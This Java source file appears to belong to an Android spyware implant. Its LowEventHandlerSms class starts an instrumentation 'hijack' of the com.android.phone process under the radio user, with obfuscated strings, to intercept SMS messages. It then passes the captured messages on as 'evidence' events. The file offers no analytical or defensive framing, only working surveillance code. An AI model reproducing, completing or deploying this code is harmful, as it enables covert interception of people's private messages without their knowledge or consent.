package com.android.dvci.listener;

import android.net.LocalServerSocket;
import android.telephony.SmsMessage;

import com.android.dvci.Core;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.ModuleMessage;
import com.android.dvci.module.message.LowEventSms;
import com.android.dvci.module.message.OutOfBandSms;
import com.android.dvci.module.message.Sms;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.LowEvent;
import com.android.dvci.util.LowEventHandlerDefs;
import com.android.dvci.util.SmsHeader;
import com.android.dvci.util.SmsMessageBase;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventHandlerSms extends Listener<LowEventSms> implements Observer<LowEventHandlerDefs> {
	//
	private static final String TAG = "LowEventHandlerSms";

	private volatile static LowEventHandlerSms singleton;
	Instrument hijack =null;

	private LowEventHandlerSms() {
		super();

	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventHandlerSms self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new LowEventHandlerSms();
				}
			}
		}
		return singleton;
	}

	@Override
	public void start() {
		LowEventHandler.self().attach(this);
		if(hijack == null) {
			hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
			hijack.setInstrumentationSuccessDir( Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"),true);
			hijack.addArg(Status.getApkName());
		}
		hijack.start();
	}

	@Override
	public void stop() {
		hijack.stop();
		LowEventHandler.self().detach(this);
	}
	@Override
	public synchronized boolean attach(Observer<LowEventSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<LowEventSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}


	@Override
	public int notification(LowEventHandlerDefs event) {
		if (event.data != null) {
			dispatch(new LowEventSms(event));
		}
		event.res = 1;
		return event.res;
	}
}
